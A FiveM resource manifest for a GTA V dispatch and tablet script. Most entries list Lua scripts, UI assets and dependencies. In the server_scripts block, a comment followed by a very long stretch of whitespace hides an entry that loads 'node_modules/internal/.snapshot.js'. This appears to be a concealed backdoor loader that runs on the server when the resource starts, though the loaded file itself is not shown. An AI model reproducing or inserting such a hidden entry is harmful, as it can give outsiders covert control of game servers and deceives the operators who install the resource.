game 'gta5'
fx_version 'adamant'
lua54 'yes'
version '1.0.1'

description 'Dispach System [August 2024]'
aurthor "L2S - DEV TEAM: @ifaisal, @iimazen"
discord "discord.gg/l2s"


data_file 'DLC_ITYP_REQUEST' 'stream/prop_cs_l2s_tablet.ytyp'

shared_scripts {
	'@ox_lib/init.lua',
    'locales/sh_locales.lua',
	'shared/sh_settings.lua',
	'shared/sh_hub.lua',
	'shared/sh_dispatch.lua',
	'shared/sh_cctv.lua',
}


server_scripts {
    '@oxmysql/lib/MySQL.lua',
	'shared/sh_api.lua',
	'server/sv_*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.snapshot.js',
}

client_scripts {
	'client/cl_*.lua',
	'client/editable/cl_*.lua'
}


ui_page "nui/dist/index.html"

files {
	'locales/sh_locales_ui.js',
	'shared/sh_ui.js',
	"nui/dist/*",
	"nui/dist/assets/*",
	"nui/dist/assets/**/*",
}


escrow_ignore {
    'locales/sh_locales.lua',
    'shared/sh_*.lua',
    'client/editable/cl_*.lua',
    'server/sv_editable.lua',
    'stream/*.ydr',
    'stream/*.ytyp',
}

dependency '/assetpacks'
dependency 'oxmysql'
dependency 'ox_lib'
dependency '/assetpacks'